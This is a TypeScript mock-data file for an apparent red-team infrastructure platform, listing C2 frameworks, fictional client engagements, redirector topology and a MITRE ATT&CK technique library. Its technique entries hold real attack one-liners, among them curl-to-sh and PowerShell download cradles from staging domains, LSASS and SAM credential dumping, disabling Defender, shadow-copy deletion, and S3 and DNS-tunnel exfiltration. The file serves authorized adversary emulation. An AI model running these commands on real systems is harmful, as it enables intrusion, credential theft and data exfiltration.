// Mock data — port of design/project/data.js, domain-vocabulary aligned per §2
import type {
  ProviderMeta,
  CloudProvider,
  C2Framework,
  Engagement,
  Scenario,
  Technique,
  CanvasNode,
  CanvasEdge,
  NodeTemplate,
  OperatorMode,
  OperatorSession,
  DeployedC2,
  Coverage,
} from "./types";

export const PROVIDERS: Record<CloudProvider, ProviderMeta> = {
  aws: { id: "aws", name: "AWS", label: "Amazon Web Services", color: "var(--aws)", short: "AWS" },
  gcp: { id: "gcp", name: "GCP", label: "Google Cloud", color: "var(--gcp)", short: "GCP" },
  azure: { id: "azure", name: "Azure", label: "Microsoft Azure", color: "var(--azure)", short: "AZ" },
  digitalocean: { id: "digitalocean", name: "DO", label: "DigitalOcean", color: "var(--do)", short: "DO" },
};

export const REGIONS: Record<CloudProvider, string[]> = {
  aws: ["us-east-1", "us-west-2", "eu-west-1", "eu-central-1", "ap-southeast-1"],
  gcp: ["us-central1", "us-east4", "europe-west1", "asia-southeast1"],
  azure: ["eastus", "westus2", "westeurope", "northeurope"],
  digitalocean: ["nyc3", "sfo3", "ams3", "fra1", "sgp1"],
};

// 8 C2 frameworks per §2 (SUPPORT_MATRIX.md). Tier 'fronted' replaces prototype's 'manual'.
export const C2_FRAMEWORKS: C2Framework[] = [
  {
    id: "sliver",
    name: "Sliver",
    tier: "orchestrated",
    tierLabel: "Fully orchestrated",
    note: "Cross-platform implants, mTLS/HTTP(S)/DNS, automated emulation supported.",
    gated: false,
    listeners: ["mTLS", "HTTPS", "WireGuard", "DNS"],
    lang: "Go · BishopFox",
  },
  {
    id: "mythic",
    name: "Mythic",
    tier: "orchestrated",
    tierLabel: "Fully orchestrated",
    note: "Modular agents via Docker profiles; full API for scripted scenarios.",
    gated: false,
    listeners: ["HTTP", "HTTPS", "WebSocket", "SMB"],
    lang: "Python · @its_a_feature_",
  },
  {
    id: "metasploit",
    name: "Metasploit",
    tier: "orchestrated",
    tierLabel: "Fully orchestrated",
    note: "msfrpcd RPC drives Meterpreter sessions; open source, no license key required.",
    gated: false,
    listeners: ["TCP", "HTTPS", "HTTP"],
    lang: "Ruby · Rapid7 (open source)",
  },
  {
    id: "custom",
    name: "In-house / Custom",
    tier: "orchestrated",
    tierLabel: "Fully orchestrated",
    note: "Bring your own framework via container image and listener spec. You own the operator surface.",
    gated: false,
    listeners: ["Custom"],
    lang: "Your image",
  },
  {
    id: "havoc",
    name: "Havoc",
    tier: "scripted",
    tierLabel: "Scripted",
    note: "Demon agent with sleep obfuscation; emulation via scripted operator API.",
    gated: false,
    listeners: ["HTTP", "HTTPS", "SMB"],
    lang: "C / ASM · @C5pider",
  },
  {
    id: "poshc2",
    name: "PoshC2",
    tier: "scripted",
    tierLabel: "Scripted",
    note: "PowerShell-native implants with Python server; scriptable but no modern formal API.",
    gated: false,
    listeners: ["HTTP", "HTTPS"],
    lang: "Python/PS · PoshSec (open source)",
  },
  {
    id: "cobalt",
    name: "Cobalt Strike",
    tier: "fronted",
    tierLabel: "Deploy & operate manually",
    note: "Beacon C2. Provision the team server; operate from your own client.",
    gated: true,
    listeners: ["HTTP", "HTTPS", "DNS", "SMB", "TCP"],
    lang: "Fortra · licensed",
  },
  {
    id: "bruteratel",
    name: "Brute Ratel C4",
    tier: "fronted",
    tierLabel: "Deploy & operate manually",
    note: "EDR-evasion-focused C2. License-gated; provision the server and operate manually with your key.",
    gated: true,
    listeners: ["HTTP", "HTTPS", "DNS"],
    lang: "Chetan Nayak · licensed",
  },
];

export const ENGAGEMENTS: Engagement[] = [
  {
    id: "ENG-2411",
    client: "Meridian Financial Group",
    codename: "Northwind",
    scope: "External perimeter + assumed-breach",
    status: "active",
    auth: "authorized",
    authBy: "K. Alvarez (CISO)",
    start: "2026-05-28",
    end: "2026-06-20",
    assets: 6,
    live: 4,
    cost: 12.40,
    lead: "R. Okafor",
    targets: ["*.meridian-fg.com", "203.0.113.0/24"],
    frameworks: ["Sliver", "Mythic"],
  },
  {
    id: "ENG-2409",
    client: "Atlas Health Systems",
    codename: "Cedar",
    scope: "Internal AD adversary emulation",
    status: "active",
    auth: "authorized",
    authBy: "D. Whitfield (VP Sec)",
    start: "2026-06-01",
    end: "2026-06-28",
    assets: 4,
    live: 3,
    cost: 8.10,
    lead: "M. Chen",
    targets: ["10.20.0.0/16", "corp.atlas-health.internal"],
    frameworks: ["Havoc"],
  },
  {
    id: "ENG-2407",
    client: "Pinnacle Retail Co.",
    codename: "Saffron",
    scope: "Web app + phishing infrastructure",
    status: "active",
    auth: "authorized",
    authBy: "L. Romano (Dir IR)",
    start: "2026-06-08",
    end: "2026-07-02",
    assets: 3,
    live: 0,
    cost: 0.00,
    lead: "R. Okafor",
    targets: ["shop.pinnacle-retail.com"],
    frameworks: ["Sliver"],
  },
  {
    id: "ENG-2402",
    client: "Vanguard Defense",
    codename: "Ironwood",
    scope: "Red team — full kill chain",
    status: "draft",
    auth: "pending",
    authBy: "—",
    start: "2026-06-15",
    end: "2026-07-20",
    assets: 0,
    live: 0,
    cost: 0.00,
    lead: "S. Park",
    targets: [],
    frameworks: [],
  },
  {
    id: "ENG-2398",
    client: "Helios Energy",
    codename: "Basalt",
    scope: "OT-adjacent assumed breach",
    status: "completed",
    auth: "expired",
    authBy: "T. Brooks (CISO)",
    start: "2026-04-10",
    end: "2026-05-09",
    assets: 7,
    live: 0,
    cost: 41.85,
    lead: "M. Chen",
    targets: ["172.16.0.0/12"],
    frameworks: ["Cobalt Strike", "Sliver"],
  },
  {
    id: "ENG-2390",
    client: "Crest Logistics",
    codename: "Marlin",
    scope: "External + social engineering",
    status: "completed",
    auth: "expired",
    authBy: "P. Nilsson (CISO)",
    start: "2026-03-02",
    end: "2026-03-30",
    assets: 5,
    live: 0,
    cost: 28.30,
    lead: "S. Park",
    targets: ["*.crest-logistics.com"],
    frameworks: ["Mythic"],
  },
];

// ATT&CK tactic order — used to group the technique library and capability views.
export const TACTIC_ORDER = [
  "Initial Access",
  "Execution",
  "Persistence",
  "Privilege Escalation",
  "Defense Evasion",
  "Credential Access",
  "Discovery",
  "Lateral Movement",
  "Collection",
  "Command and Control",
  "Exfiltration",
  "Impact",
];

// TECHNIQUE_LIBRARY — the portable technique catalog (domain.Technique). Each
// entry carries a plain-language description and the procedure commands RInfra
// runs; an Operator adapter translates these to its framework's primitives.
export const TECHNIQUE_LIBRARY: Technique[] = [
  // ----- Initial Access -----
  {
    id: "T1566.002", name: "Spearphishing Link", tactic: "Initial Access",
    description: "A targeted email lures the user to a credential-harvesting or payload link hosted on the engagement's staging host.",
    commands: ["# stage the lure on the payload host", "curl -sk https://updates-delivery.net/v/STAGE | sh"],
  },
  {
    id: "T1566.001", name: "Spearphishing Attachment", tactic: "Initial Access",
    description: "A weaponised document (macro / LNK / ISO) is delivered as an attachment and executes the stager on open.",
    commands: ["# generate the maldoc + stager", "rundll32.exe stager.dll,StartW"],
  },
  {
    id: "T1078", name: "Valid Accounts", tactic: "Initial Access",
    description: "Authenticate with previously obtained valid credentials rather than exploiting a vulnerability.",
    commands: ["runas /user:CORP\\svc_backup cmd.exe"],
  },
  {
    id: "T1078.004", name: "Valid Accounts: Cloud", tactic: "Initial Access",
    description: "Use stolen cloud/SaaS credentials or session tokens to sign in to the tenant identity provider.",
    commands: ["az login -u victim@corp.com -p '<password>'", "aws sts get-caller-identity"],
  },

  // ----- Execution -----
  {
    id: "T1059.001", name: "PowerShell", tactic: "Execution",
    description: "Execute commands and download cradles through powershell.exe, often with -enc/-nop to evade logging.",
    commands: ["powershell -nop -w hidden -enc <base64>", "IEX (New-Object Net.WebClient).DownloadString('https://cdn-static-assets.net/a')"],
  },
  {
    id: "T1204.002", name: "User Execution: Malicious File", tactic: "Execution",
    description: "Rely on the user double-clicking a delivered file to run the embedded payload.",
    commands: ["start invoice.pdf.lnk"],
  },
  {
    id: "T1047", name: "Windows Management Instrumentation", tactic: "Execution",
    description: "Use WMI to execute processes locally or on remote hosts without dropping a binary.",
    commands: ["wmic /node:10.0.0.5 process call create \"cmd /c whoami\"", "Get-WmiObject -Class Win32_Process"],
  },

  // ----- Persistence -----
  {
    id: "T1547.001", name: "Registry Run Keys / Startup Folder", tactic: "Persistence",
    description: "Add an autorun entry so the implant relaunches at user logon.",
    commands: ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\u.exe\""],
  },
  {
    id: "T1053.005", name: "Scheduled Task", tactic: "Persistence",
    description: "Register a scheduled task that executes the payload on a trigger or interval.",
    commands: ["schtasks /create /tn \"OneDriveSync\" /tr C:\\\\Users\\\\Public\\\\u.exe /sc minute /mo 30 /f"],
  },
  {
    id: "T1098.001", name: "Account Manipulation: Additional Cloud Credentials", tactic: "Persistence",
    description: "Attach an extra credential (key/cert/secret) to a cloud principal to keep access after the original is revoked.",
    commands: ["az ad app credential reset --id <appId>", "aws iam create-access-key --user-name svc-deploy"],
  },
  {
    id: "T1136.001", name: "Create Account: Local Account", tactic: "Persistence",
    description: "Create a new local account to retain access independent of the compromised user.",
    commands: ["net user svc_help P@ssw0rd! /add", "net localgroup administrators svc_help /add"],
  },

  // ----- Privilege Escalation -----
  {
    id: "T1548.002", name: "Bypass User Account Control", tactic: "Privilege Escalation",
    description: "Abuse an auto-elevating binary or registry hijack to run code at high integrity without a UAC prompt.",
    commands: ["reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe /f", "fodhelper.exe"],
  },

  // ----- Defense Evasion -----
  {
    id: "T1055", name: "Process Injection", tactic: "Defense Evasion",
    description: "Inject implant code into a legitimate process to blend in and evade process-based detections.",
    commands: ["# inject shellcode into a benign host process", "inject --pid 4120 --arch x64 beacon.bin"],
  },
  {
    id: "T1112", name: "Modify Registry", tactic: "Defense Evasion",
    description: "Change registry values to weaken defenses, hide artifacts, or store configuration.",
    commands: ["reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f"],
  },
  {
    id: "T1562.001", name: "Impair Defenses: Disable Tools", tactic: "Defense Evasion",
    description: "Disable or tamper with AV/EDR services and logging to reduce the chance of detection.",
    commands: ["Set-MpPreference -DisableRealtimeMonitoring $true", "sc stop Sense"],
  },
  {
    id: "T1197", name: "BITS Jobs", tactic: "Defense Evasion",
    description: "Use the Background Intelligent Transfer Service to download payloads and persist via a signed LOLBin.",
    commands: ["bitsadmin /transfer j /download /priority high https://cdn-static-assets.net/p %TEMP%\\\\p.exe"],
  },
  {
    id: "T1218.011", name: "Signed Binary Proxy: Rundll32", tactic: "Defense Evasion",
    description: "Proxy execution through the trusted rundll32.exe so the payload runs under a signed Microsoft binary.",
    commands: ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();new ActiveXObject(\"WScript.Shell\")"],
  },

  // ----- Credential Access -----
  {
    id: "T1003.001", name: "OS Credential Dumping: LSASS Memory", tactic: "Credential Access",
    description: "Read the LSASS process memory to extract plaintext passwords, hashes and Kerberos tickets.",
    commands: ["# dump lsass via comsvcs minidump", "rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\\\\Windows\\\\Temp\\\\l.dmp full"],
  },
  {
    id: "T1003.002", name: "OS Credential Dumping: SAM", tactic: "Credential Access",
    description: "Extract local account password hashes from the SAM database via registry hives.",
    commands: ["reg save HKLM\\SAM sam.hive", "reg save HKLM\\SYSTEM system.hive"],
  },
  {
    id: "T1555.003", name: "Credentials from Web Browsers", tactic: "Credential Access",
    description: "Decrypt saved logins and cookies from Chromium/Firefox profiles on the host.",
    commands: ["# pull and decrypt browser login data", "sqlite3 \"%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data\" .dump"],
  },
  {
    id: "T1621", name: "Multi-Factor Authentication Request Generation", tactic: "Credential Access",
    description: "Spam repeated MFA push prompts ('MFA fatigue') until the target approves one.",
    commands: ["# trigger repeated push prompts against the IdP", "for i in $(seq 1 20); do okta-auth push victim@corp.com; done"],
  },

  // ----- Discovery -----
  {
    id: "T1018", name: "Remote System Discovery", tactic: "Discovery",
    description: "Enumerate other hosts on the network to plan lateral movement.",
    commands: ["net view /all", "nltest /dclist:corp"],
  },
  {
    id: "T1057", name: "Process Discovery", tactic: "Discovery",
    description: "List running processes to identify security tooling and injection targets.",
    commands: ["tasklist /v", "Get-Process"],
  },
  {
    id: "T1082", name: "System Information Discovery", tactic: "Discovery",
    description: "Collect host details — OS version, hardware, hostname, domain — to fingerprint the target.",
    commands: ["systeminfo", "Get-CimInstance Win32_OperatingSystem | fl *"],
  },
  {
    id: "T1016", name: "System Network Configuration Discovery", tactic: "Discovery",
    description: "Read local network configuration (interfaces, routes, DNS, ARP) to understand the environment.",
    commands: ["ipconfig /all", "arp -a", "route print"],
  },
  {
    id: "T1083", name: "File and Directory Discovery", tactic: "Discovery",
    description: "Search the filesystem for sensitive files and staging locations.",
    commands: ["dir /s /b C:\\\\Users\\\\*.kdbx", "Get-ChildItem -Recurse -Include *.config"],
  },
  {
    id: "T1087.002", name: "Account Discovery: Domain Account", tactic: "Discovery",
    description: "Enumerate domain users and groups to find privileged targets.",
    commands: ["net group \"Domain Admins\" /domain", "Get-ADUser -Filter *"],
  },
  {
    id: "T1538", name: "Cloud Service Dashboard", tactic: "Discovery",
    description: "Browse the cloud provider console/portal to inventory resources and identities.",
    commands: ["az resource list -o table", "aws resourcegroupstaggingapi get-resources"],
  },

  // ----- Lateral Movement -----
  {
    id: "T1021.001", name: "Remote Services: RDP", tactic: "Lateral Movement",
    description: "Move laterally over the Remote Desktop Protocol with valid credentials.",
    commands: ["xfreerdp /u:CORP\\\\admin /v:10.0.0.6 /cert-ignore"],
  },
  {
    id: "T1570", name: "Lateral Tool Transfer", tactic: "Lateral Movement",
    description: "Copy tools/implants between hosts inside the network to expand access.",
    commands: ["copy beacon.exe \\\\10.0.0.6\\C$\\Windows\\Temp\\b.exe"],
  },
  {
    id: "T1021.002", name: "Remote Services: SMB/Admin Shares", tactic: "Lateral Movement",
    description: "Execute payloads on remote hosts via SMB admin shares and service creation (psexec-style).",
    commands: ["psexec \\\\10.0.0.6 -u CORP\\admin -c b.exe"],
  },

  // ----- Collection -----
  {
    id: "T1560.001", name: "Archive Collected Data", tactic: "Collection",
    description: "Compress and optionally encrypt staged data prior to exfiltration.",
    commands: ["7z a -p<pass> -mhe loot.7z C:\\\\Users\\\\*\\\\Documents"],
  },

  // ----- Command and Control -----
  {
    id: "T1071.001", name: "Application Layer Protocol: Web", tactic: "Command and Control",
    description: "Beacon over HTTP/S through the categorised-domain redirector to blend with normal web traffic.",
    commands: ["# implant beacons to the HTTPS redirector", "GET https://cdn-static-assets.net/jquery.min.js"],
  },
  {
    id: "T1105", name: "Ingress Tool Transfer", tactic: "Command and Control",
    description: "Download additional tooling from C2/staging onto the compromised host.",
    commands: ["certutil -urlcache -f https://updates-delivery.net/t t.exe"],
  },

  // ----- Exfiltration -----
  {
    id: "T1567.002", name: "Exfiltration to Cloud Storage", tactic: "Exfiltration",
    description: "Upload staged data to an attacker-controlled cloud bucket so it blends with sanctioned SaaS traffic.",
    commands: ["aws s3 cp loot.7z s3://exfil-bucket/ --no-progress"],
  },
  {
    id: "T1048", name: "Exfiltration Over Alternative Protocol", tactic: "Exfiltration",
    description: "Move data out over a protocol distinct from the C2 channel (DNS / ICMP / FTP).",
    commands: ["# chunk + tunnel over DNS", "for c in $(split loot.7z); do dig $c.exfil.telemetry-sync.com; done"],
  },

  // ----- Impact -----
  {
    id: "T1486", name: "Data Encrypted for Impact", tactic: "Impact",
    description: "Encrypt files to disrupt availability (dry-run only — RInfra never deploys real ransomware payloads).",
    commands: ["# DRY RUN — enumerates targets, writes no ciphertext", "ransim --dry-run --path C:\\\\Share"],
  },
  {
    id: "T1490", name: "Inhibit System Recovery", tactic: "Impact",
    description: "Delete shadow copies and backups so encrypted data cannot be restored.",
    commands: ["vssadmin delete shadows /all /quiet", "wbadmin delete catalog -quiet"],
  },
];

// Resolve a library technique by id; falls back to a minimal entry if unknown.
function lib(id: string): Technique {
  return TECHNIQUE_LIBRARY.find((t) => t.id === id) ?? { id, name: id, tactic: "Execution" };
}

// Look up full technique detail (description/commands) by id, for the UI.
export function techniqueById(id: string): Technique | undefined {
  return TECHNIQUE_LIBRARY.find((t) => t.id === id);
}

export const SCENARIOS: Scenario[] = [
  {
    id: "apt29",
    name: "APT29 — Cozy Bear",
    actor: "Nation-state · espionage",
    desc: "Emulates Midnight Blizzard tradecraft: spearphishing, stealthy persistence, credential theft, and slow exfil over HTTPS.",
    techniques: ["T1566.002", "T1059.001", "T1547.001", "T1055", "T1003.001", "T1018", "T1021.001", "T1567.002"].map(lib),
  },
  {
    id: "fin7",
    name: "FIN7 — Carbanak",
    actor: "Financial · criminal",
    desc: "Point-of-sale and finance-team targeting: malicious documents, in-memory loaders, and lateral movement to payment systems.",
    techniques: ["T1566.001", "T1204.002", "T1053.005", "T1112", "T1555.003", "T1057", "T1570"].map(lib),
  },
  {
    id: "ransom",
    name: "Ransomware Affiliate",
    actor: "eCrime · big-game hunting",
    desc: "Modern intrusion-to-encryption chain: valid accounts, defense impairment, mass discovery and staged impact (dry-run, no payload).",
    techniques: ["T1078", "T1562.001", "T1018", "T1486", "T1490"].map(lib),
  },
  {
    id: "scattered",
    name: "Scattered Spider — Octo Tempest",
    actor: "eCrime · identity-driven",
    desc: "Help-desk social engineering into cloud identity: MFA fatigue, OAuth/credential abuse, and SaaS data theft over HTTPS.",
    techniques: ["T1078.004", "T1621", "T1098.001", "T1538", "T1567.002"].map(lib),
  },
  {
    id: "lotl",
    name: "Living off the Land",
    actor: "Generic · detection baseline",
    desc: "Built-in-binary baseline: WMI execution, BITS transfer, scheduled tasks, signed-binary proxy execution and host discovery.",
    techniques: ["T1047", "T1197", "T1053.005", "T1218.011", "T1082", "T1016"].map(lib),
  },
];

// Initial topology for the hero engagement (ENG-2411)
// node types use domain vocabulary: c2_server / payload_host
export const INITIAL_NODES: CanvasNode[] = [
  {
    id: "n1",
    type: "redirector",
    subtype: "HTTPS",
    name: "edge-https-01",
    provider: "aws",
    region: "us-east-1",
    status: "live",
    health: 98,
    ip: "203.0.113.18",
    domain: "cdn-static-assets.net",
    x: 80,
    y: 150,
    cost: 0.42,
  },
  {
    id: "n2",
    type: "redirector",
    subtype: "DNS",
    name: "edge-dns-01",
    provider: "digitalocean",
    region: "nyc3",
    status: "live",
    health: 95,
    ip: "198.51.100.7",
    domain: "ns1.telemetry-sync.com",
    x: 80,
    y: 360,
    cost: 0.31,
  },
  {
    id: "n3",
    type: "c2_server",
    subtype: "Sliver",
    name: "teamserver-01",
    provider: "gcp",
    region: "us-central1",
    status: "live",
    health: 99,
    ip: "10.0.4.12",
    framework: "sliver",
    listener: "mTLS",
    x: 470,
    y: 150,
    cost: 1.85,
  },
  {
    id: "n4",
    type: "c2_server",
    subtype: "Mythic",
    name: "teamserver-02",
    provider: "azure",
    region: "eastus",
    status: "provisioning",
    health: 0,
    ip: "—",
    framework: "mythic",
    listener: "HTTPS",
    x: 470,
    y: 360,
    cost: 1.85,
  },
  {
    id: "n5",
    type: "payload_host",
    subtype: "Staging",
    name: "stage-host-01",
    provider: "aws",
    region: "us-east-1",
    status: "live",
    health: 92,
    ip: "203.0.113.44",
    domain: "updates-delivery.net",
    x: 860,
    y: 255,
    cost: 0.38,
  },
];

export const INITIAL_EDGES: CanvasEdge[] = [
  { id: "e1", from: "n1", to: "n3" },
  { id: "e2", from: "n2", to: "n3" },
  { id: "e3", from: "n1", to: "n4" },
  { id: "e4", from: "n3", to: "n5" },
];

export const NODE_TEMPLATES: NodeTemplate[] = [
  { type: "redirector", subtype: "HTTPS", label: "HTTPS Redirector", icon: "Globe", desc: "TLS traffic relay" },
  { type: "redirector", subtype: "HTTP", label: "HTTP Redirector", icon: "Globe", desc: "Cleartext relay" },
  { type: "redirector", subtype: "DNS", label: "DNS Redirector", icon: "Dns", desc: "DNS-over-relay" },
  { type: "c2_server", subtype: "Sliver", label: "C2 Server", icon: "Server", desc: "Team server host" },
  { type: "payload_host", subtype: "Staging", label: "Staging Host", icon: "HardDrive", desc: "Payload delivery" },
];

// Per-framework operator-access spec: how operators connect a native client and
// how fully RInfra automates it. Mirrors the control plane's per-framework
// c2.ManualAccess descriptors + support tiers.
export interface C2AccessSpec {
  client: string;
  protocol: string;
  port: number;
  mode: OperatorMode;
  liveClient: string; // "" for manual-only (Fronted tier)
  instructions: string;
}

export const C2_OPERATOR_ACCESS: Record<string, C2AccessSpec> = {
  sliver: {
    client: "sliver-client",
    protocol: "grpc-mtls",
    port: 31337,
    mode: "live",
    liveClient: "gRPC operator API (mTLS)",
    instructions:
      "Fetch the operator .cfg from the teamserver, open the tunnel, then `sliver-client import <cfg>` — it reaches the multiplayer listener at 127.0.0.1:31337 through the tunnel.",
  },
  mythic: {
    client: "Mythic web UI",
    protocol: "web-ui",
    port: 7443,
    mode: "live",
    liveClient: "GraphQL scripting API",
    instructions:
      "Open the tunnel, then browse https://127.0.0.1:7443 and log in with the operator credentials set at install. Drive tasks from the UI.",
  },
  metasploit: {
    client: "msfconsole / msfrpcd client",
    protocol: "https",
    port: 55553,
    mode: "live",
    liveClient: "msfrpcd RPC",
    instructions:
      "Open the tunnel, then connect your client to 127.0.0.1:55553 with the RPC credentials from /etc/msf/rpc.env.",
  },
  custom: {
    client: "your operator client",
    protocol: "tcp",
    port: 8443,
    mode: "live",
    liveClient: "your operator surface",
    instructions:
      "Open the tunnel and connect your client to the operator port you defined for this framework.",
  },
  havoc: {
    client: "Havoc client",
    protocol: "tcp",
    port: 40056,
    mode: "scripted",
    liveClient: "scripted operator API",
    instructions:
      "Open the tunnel, then connect the Havoc client to 127.0.0.1:40056. Some emulation steps are scripted; the rest are driven by hand.",
  },
  poshc2: {
    client: "PoshC2 ImplantHandler",
    protocol: "tcp",
    port: 8443,
    mode: "scripted",
    liveClient: "scripted CLI",
    instructions:
      "Open the tunnel and use the PoshC2 server CLI over it. Partial scripting; the operator drives the rest.",
  },
  cobalt: {
    client: "Cobalt Strike client (aggressor)",
    protocol: "tcp",
    port: 50050,
    mode: "manual",
    liveClient: "",
    instructions:
      "Open the tunnel, then connect the Cobalt Strike client to 127.0.0.1:50050 with the team server password set at deploy time. RInfra provisions and fronts CS; the operator drives it.",
  },
  bruteratel: {
    client: "Brute Ratel C4 commander",
    protocol: "https",
    port: 443,
    mode: "manual",
    liveClient: "",
    instructions:
      "Open the tunnel, then point the Brute Ratel commander at 127.0.0.1:443 with the operator profile/license for this engagement.",
  },
};

// Mock active operator sessions, keyed by C2 node id. Surfaced only for live nodes.
export const OPERATOR_SESSIONS: Record<string, OperatorSession[]> = {
  n3: [
    { id: "9f3c1a2b", host: "WS-FIN-04", user: "CORP\\j.reyes", os: "windows/amd64" },
    { id: "2b77e0d4", host: "SRV-DC-01", user: "NT AUTHORITY\\SYSTEM", os: "windows/amd64" },
  ],
};

// Renders the operator ssh local-forward command, matching the control plane's
// c2.TunnelSpec.SSHCommand format.
export function buildSSHCommand(ip: string, port: number): string {
  return `ssh -i <engagement-ssh-key> -N -L ${port}:127.0.0.1:${port} root@${ip} -p 22`;
}

// Builds a DeployedC2 view for a c2_server node from the framework catalog and
// the per-framework operator-access spec. Returns null for non-C2 / unknown
// nodes so callers can filter cleanly.
export function deployedC2FromNode(node: CanvasNode): DeployedC2 | null {
  if (node.type !== "c2_server" || !node.framework) return null;
  const fw = C2_FRAMEWORKS.find((f) => f.id === node.framework);
  const access = C2_OPERATOR_ACCESS[node.framework];
  if (!fw || !access) return null;
  const live = node.status === "live";
  return {
    nodeId: node.id,
    name: node.name,
    ip: node.ip,
    status: node.status,
    framework: fw.id,
    frameworkName: fw.name,
    tier: fw.tier,
    listener: node.listener ?? fw.listeners[0] ?? "",
    operatorMode: access.mode,
    liveClient: access.liveClient,
    manual: {
      client: access.client,
      protocol: access.protocol,
      operatorPort: access.port,
      sshCommand: buildSSHCommand(live ? node.ip : "<teamserver-ip>", access.port),
      instructions: access.instructions,
    },
    sessions: live ? OPERATOR_SESSIONS[node.id] ?? [] : [],
  };
}

// ---------- TTP <-> C2 capability mapping ----------
// Which ATT&CK tactics each framework can automate through its operator API.
// This is the "functionality map" surfaced to users: orchestrated frameworks
// cover broad post-exploitation, scripted frameworks a documented subset, and
// fronted frameworks expose no operator API (every technique is driven by hand).
export const C2_TACTIC_SUPPORT: Record<string, string[]> = {
  sliver: [
    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
    "Credential Access", "Discovery", "Lateral Movement", "Collection",
    "Command and Control", "Exfiltration",
  ],
  mythic: [
    "Execution", "Persistence", "Privilege Escalation", "Defense Evasion",
    "Credential Access", "Discovery", "Lateral Movement", "Collection",
    "Command and Control", "Exfiltration",
  ],
  metasploit: [
    "Initial Access", "Execution", "Persistence", "Privilege Escalation",
    "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
    "Command and Control",
  ],
  custom: [...TACTIC_ORDER], // bring-your-own surface — you own coverage
  havoc: [
    "Execution", "Defense Evasion", "Credential Access", "Discovery",
    "Lateral Movement", "Command and Control",
  ],
  poshc2: [
    "Execution", "Persistence", "Credential Access", "Discovery",
    "Lateral Movement",
  ],
  // cobalt / bruteratel (fronted): no entry — operated manually.
};

// How each framework delivers a command — the native primitive an Operator
// adapter translates a portable technique down to.
export const C2_DELIVERY: Record<string, string> = {
  sliver: "execute / execute-assembly",
  mythic: "agent tasking (shell / run)",
  metasploit: "meterpreter + post modules",
  custom: "your task primitive",
  havoc: "inline-execute / shell",
  poshc2: "implant tasking",
  cobalt: "Beacon console (manual)",
  bruteratel: "Badger console (manual)",
};

// c2SupportsTactic reports whether the framework can automate the tactic.
export function c2SupportsTactic(frameworkId: string, tactic: string): boolean {
  const fw = C2_FRAMEWORKS.find((f) => f.id === frameworkId);
  if (!fw || fw.tier === "fronted") return false;
  return (C2_TACTIC_SUPPORT[frameworkId] ?? []).includes(tactic);
}

// Framework ids that can automate the given tactic (for capability chips).
export function frameworksSupportingTactic(tactic: string): string[] {
  return C2_FRAMEWORKS.filter((f) => c2SupportsTactic(f.id, tactic)).map((f) => f.id);
}

// Demo ATT&CK coverage rollup — what MockClient.getCoverage returns so the
// reporting page renders the same shape it gets from the real backend.
function cov(tactic: string, techs: [string, string, number][]): { tactic: string; techniques: { attackID: string; name: string; tactic: string; level: number }[] } {
  return {
    tactic,
    techniques: techs.map(([attackID, name, level]) => ({ attackID, name, tactic, level })),
  };
}

export function buildMockCoverage(engagementId: string): Coverage {
  const tactics = [
    cov("Initial Access", [["T1566", "Phishing", 3], ["T1078", "Valid Accounts", 2], ["T1190", "Exploit Public App", 1], ["T1189", "Drive-by", 0]]),
    cov("Execution", [["T1059.001", "PowerShell", 3], ["T1053.005", "Scheduled Task", 2], ["T1047", "WMI", 1], ["T1204.002", "User Execution", 3]]),
    cov("Persistence", [["T1547.001", "Run Keys", 3], ["T1053.005", "Scheduled Task", 2], ["T1078", "Valid Accounts", 2], ["T1543", "Services", 0]]),
    cov("Defense Evasion", [["T1055", "Process Injection", 3], ["T1027", "Obfuscation", 2], ["T1562.001", "Disable Tools", 1], ["T1112", "Modify Registry", 2]]),
    cov("Credential Access", [["T1003.001", "LSASS Memory", 3], ["T1555.003", "Browser Creds", 2], ["T1558.003", "Kerberoasting", 1], ["T1056.001", "Keylogging", 0]]),
    cov("Discovery", [["T1018", "Remote System", 3], ["T1057", "Process Disc.", 3], ["T1087", "Account Disc.", 2], ["T1135", "Network Share", 1]]),
    cov("Lateral Movement", [["T1021.001", "RDP", 2], ["T1570", "Tool Transfer", 2], ["T1550.002", "Pass the Hash", 1], ["T1021.002", "SMB/Admin$", 0]]),
    cov("Exfiltration", [["T1567.002", "Cloud Storage", 2], ["T1041", "C2 Channel", 3], ["T1567", "Web Service", 1]]),
  ];
  let total = 0,
    exercised = 0,
    executed = 0,
    validated = 0;
  for (const t of tactics)
    for (const te of t.techniques) {
      total++;
      if (te.level >= 1) exercised++;
      if (te.level >= 2) executed++;
      if (te.level === 3) validated++;
    }
  return {
    engagementId,
    tactics,
    totalTechniques: total,
    exercisedCount: exercised,
    executedCount: executed,
    validatedCount: validated,
  };
}

export const STATUS_META: Record<string, { label: string; cls: string }> = {
  live: { label: "Live", cls: "ok" },
  provisioning: { label: "Provisioning", cls: "warn" },
  draining: { label: "Draining", cls: "info" },
  destroyed: { label: "Destroyed", cls: "" },
  pending: { label: "Draft", cls: "" },
  failed: { label: "Failed", cls: "danger" },
};
